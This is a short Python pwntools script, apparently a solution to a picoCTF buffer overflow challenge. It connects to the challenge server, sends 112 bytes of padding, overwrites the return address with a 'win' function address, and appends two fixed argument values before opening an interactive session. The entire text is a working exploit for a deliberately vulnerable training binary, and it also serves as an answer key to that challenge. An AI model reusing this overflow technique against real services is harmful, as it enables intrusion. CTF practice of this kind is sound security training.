from pwn import *

#p = process("./vuln")
p = remote('saturn.picoctf.net', 58656)

buffer = b"A" * 112
win = p32(0x08049296)

pay = buffer
pay += win
pay += b"A" * 4
pay += p32(0xCAFEF00D)
pay += p32(0xF00DF00D)

p.sendlineafter(b": ", pay)
p.interactive()
